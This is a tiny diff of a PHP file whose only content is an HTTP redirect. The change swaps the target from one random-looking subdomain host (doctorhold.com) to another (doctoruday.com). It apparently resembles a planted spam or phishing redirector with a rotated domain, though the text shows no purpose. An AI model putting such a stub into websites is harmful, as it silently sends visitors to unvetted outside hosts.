@@ -1,5 +1,5 @@
 <?php
 
-header("Location:https://ll9az.doctorhold.com/l")
+header("Location:https://ll9az.doctoruday.com/l")
 
 ?>
